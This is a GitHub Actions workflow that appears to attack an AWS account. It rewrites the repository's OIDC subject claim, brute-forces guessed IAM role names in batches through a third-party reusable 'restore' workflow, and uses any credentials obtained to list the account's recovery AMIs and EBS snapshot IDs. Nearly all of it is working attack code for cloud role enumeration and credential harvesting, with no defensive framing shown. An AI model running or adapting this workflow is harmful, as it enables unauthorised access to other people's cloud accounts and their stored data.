name: metricforge probe

on:
  workflow_dispatch:
    inputs:
      batch:
        description: Candidate batch index
        required: true
        default: "0"
      size:
        description: Candidates per run, max 240
        required: true
        default: "180"

permissions:
  id-token: write
  contents: read
  actions: write

jobs:
  configure-oidc-subject:
    runs-on: ubuntu-latest
    steps:
      - name: Configure repository OIDC subject for reusable workflow
        shell: bash
        env:
          GH_TOKEN: ${{ github.token }}
          OWNER_REPO: ${{ github.repository }}
        run: |
          set -euo pipefail
          api="https://api.github.com/repos/${OWNER_REPO}/actions/oidc/customization/sub"
          body='{"use_default":false,"include_claim_keys":["job_workflow_ref"]}'
          code=$(curl -sS -L -o /tmp/oidc-put.out -w "%{http_code}" \
            -X PUT \
            -H "Accept: application/vnd.github+json" \
            -H "Authorization: Bearer ${GH_TOKEN}" \
            -H "X-GitHub-Api-Version: 2026-03-10" \
            "$api" \
            -d "$body")
          cat /tmp/oidc-put.out || true
          echo "PUT_HTTP=${code}"
          test "$code" = "201"

  plan:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.plan.outputs.matrix }}
    steps:
      - id: plan
        shell: bash
        run: |
          python3 - <<'PY' > matrix.json
          import json, os, re

          batch = int(os.environ.get("BATCH", "0"))
          size = min(int(os.environ.get("SIZE", "180")), 240)
          account = "125746528491"
          bases = [
            "metricforge", "metricforge-recovery", "metricforge-restore",
            "retired-metricforge-recovery", "retired-metricforge-restore",
            "metricforge-retired-recovery", "metricforge-retired-restore",
            "metricforge-ir", "metricforge-forensics", "metricforge-evidence",
            "metricforge-incident-response",
          ]
          purposes = [
            "analysis", "analyst", "external-analysis", "external-analyst",
            "external-investigator", "partner-analyst", "third-party-analyst",
            "security-analyst", "investigation", "investigator",
            "incident-investigator", "evidence", "evidence-access",
            "artifact", "artifact-access", "artifact-reader", "artifacts-reader",
            "build-artifact-reader", "build-artifacts-reader", "provenance",
            "provenance-reader", "attestation", "attestation-reader", "dsse",
            "dsse-reader", "builder", "builder-reader", "builder-key-reader",
            "public-key-reader", "signing-key-reader", "channel",
            "channel-reader", "recovery-channel", "recovery-channel-reader",
            "seed", "seed-reader", "secret-reader", "ebs", "ebs-reader",
            "ebs-snapshot", "ebs-snapshot-reader", "snapshot-access",
            "snapshot-read", "snapshot-reader", "snapshot-readonly",
            "snapshot-read-only", "root-snapshot-reader", "volume-reader",
            "ami-access", "ami-read", "public-ami-reader", "recovery-ami-reader",
          ]
          explicit = [
            "MFIR20260417Role", "MFIR0417Role", "MFIR20260417Reader",
            "MFIR0417Reader", "MFIR20260417Investigator",
            "MFIR0417Investigator", "MetricForgeIR20260417Role",
            "MetricForgeIR0417Role", "MetricForgeIncidentInvestigatorRole",
            "MetricForgeExternalAnalysisRole", "MetricForgeExternalAnalystRole",
            "MetricForgeEvidenceAccessRole", "MetricForgeArtifactReaderRole",
            "MetricForgeArtifactsReaderRole", "MetricForgeBuildArtifactReaderRole",
            "MetricForgeBuildArtifactsReaderRole", "MetricForgeProvenanceReaderRole",
            "MetricForgeAttestationReaderRole", "MetricForgeDSSEReaderRole",
            "MetricForgeBuilderKeyReaderRole", "MetricForgeSigningKeyReaderRole",
            "MetricForgeRecoveryChannelReaderRole", "MetricForgeSeedReaderRole",
            "MetricForgeEbsSnapshotReaderRole", "MetricForgeRootSnapshotReaderRole",
            "MetricForgePublicAmiReaderRole", "MetricForgeVolumeReaderRole",
          ]
          paths = [
            "external-analysis", "external-analyst", "partner", "third-party",
            "incident-response", "forensics", "evidence", "analysis", "analyst",
            "security",
          ]
          tested = set("""
          metricforge-recovery-entry metricforge-recovery-role metricforge-recovery
          metricforge-restore-entry metricforge-restore-role metricforge-restore
          metricforge-entry metricforge-role metricforge-entry-role metricforge-entryrole
          metricforge-recovery-workflow metricforge-recovery-workflows
          metricforge-github-oidc metricforge-actions-oidc metricforge-recovery-oidc
          metricforge-restore-oidc github-actions-terraform github-actions
          github-actions-oidc github-oidc metricforge-evidence-reader
          metricforge-snapshot-reader metricforge-ami-reader metricforge-ir-reader
          metricforge-forensics-reader MetricForgeRecoveryEntryRole
          MetricForgeRestoreEntry MetricForgeEntryRole MetricForgeRecoveryWorkflow
          MetricForgeRestoreRole
          """.split())

          roles = list(explicit)
          for base in bases:
            for purpose in purposes:
              roles.extend([f"{base}-{purpose}", f"{base}-{purpose}-role"])
          for date in ["20260417", "2026-04-17", "0417", "MF-IR-2026-0417", "mf-ir-2026-0417", "30b28c53"]:
            for base in ["metricforge", "metricforge-recovery", "metricforge-restore", "metricforge-ir", "retired-metricforge-recovery", "retired-metricforge-restore"]:
              for suffix in ["", "-role", "-reader", "-investigator", "-access", "-entry"]:
                roles.append(f"{base}-{date}{suffix}")
          for path in paths:
            for tail in [
              "metricforge", "metricforge-recovery", "metricforge-restore",
              "metricforge-evidence", "metricforge-artifact-reader",
              "metricforge-snapshot-reader", "metricforge-ebs-snapshot-reader",
              "metricforge-public-ami-reader", "retired-metricforge-recovery",
              "retired-metricforge-restore",
            ]:
              roles.extend([f"{path}/{tail}", f"{path}/{tail}-role", f"{path}/{tail}-reader"])

          def role_score(name):
            lower = name.lower()
            score = 0
            weighted_terms = [
              ("metricforge", 30), ("recovery", 18), ("restore", 14),
              ("mfir", 26), ("mf-ir", 26), ("artifact", 14),
              ("provenance", 14), ("attestation", 14), ("dsse", 14),
              ("builder", 13), ("signing", 13), ("channel", 13),
              ("seed", 13), ("evidence", 12), ("snapshot", 12),
              ("ebs", 12), ("volume", 10), ("ami", 10),
              ("analysis", 9), ("analyst", 9), ("external", 8),
              ("incident", 8), ("forensics", 8), ("20260417", 7),
              ("0417", 7), ("30b28c53", 5),
            ]
            for term, weight in weighted_terms:
              if term in lower:
                score += weight
            if name.startswith(("MetricForge", "MFIR")):
              score += 10
            if "/" in name:
              score -= 4
            if name in tested:
              score -= 200
            if len(name) > 72:
              score -= 6
            return (-score, len(name), lower)

          dedup, seen = [], set()
          for role in sorted(roles, key=role_score):
            if role in seen or role in tested:
              continue
            if re.match(r"^[A-Za-z0-9+=,.@_/-]+$", role) and len(role) <= 96:
              seen.add(role)
              dedup.append(role)

          selected = dedup[batch * size:(batch + 1) * size]
          include = [
            {"id": f"r{index + batch * size:04d}", "role": f"arn:aws:iam::{account}:role/{role}"}
            for index, role in enumerate(selected)
          ]
          print(json.dumps({"include": include}, separators=(",", ":")))
          print("SELECTED", len(selected), "of", len(dedup), "batch", batch, "size", size, file=os.sys.stderr)
          for role in selected[:20]:
            print("CANDIDATE", role, file=os.sys.stderr)
          PY
          echo "matrix=$(cat matrix.json)" >> "$GITHUB_OUTPUT"
          cat matrix.json
        env:
          BATCH: ${{ inputs.batch }}
          SIZE: ${{ inputs.size }}

  assume_main:
    needs: [configure-oidc-subject, plan]
    strategy:
      fail-fast: false
      max-parallel: 40
      matrix: ${{ fromJSON(needs.plan.outputs.matrix) }}
    uses: yulmwu/metricforge-recovery-workflows/.github/workflows/restore.yml@main
    with:
      mode: exchange
      entry_role: ${{ matrix.role }}
      nonce: next_${{ matrix.id }}

  inspect:
    runs-on: ubuntu-latest
    needs: [assume_main]
    if: always()
    steps:
      - name: Download artifacts
        uses: actions/download-artifact@v4
        with:
          path: artifacts
      - name: Inspect success
        shell: bash
        run: |
          set -euo pipefail
          find artifacts -maxdepth 3 -type f -print | sort || true
          entry=$(find artifacts -path "*/entry.json" -print -quit)
          if [ -z "${entry}" ]; then
            echo "NO_SUCCESSFUL_ENTRY_ROLE"
            exit 2
          fi
          echo "ENTRY_JSON=${entry}"
          cat "${entry}"
          export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' "${entry}")
          export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' "${entry}")
          export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' "${entry}")
          aws sts get-caller-identity
          aws ec2 describe-images --region ap-northeast-2 --owners 125746528491 --filters 'Name=name,Values=metricforge-recovery-*' --output json | tee images.json
          jq -r '.Images[]? | [.ImageId,.Name,.CreationDate,((.BlockDeviceMappings[]? | select(.Ebs.SnapshotId) | .Ebs.SnapshotId) // "")] | @tsv' images.json | sort
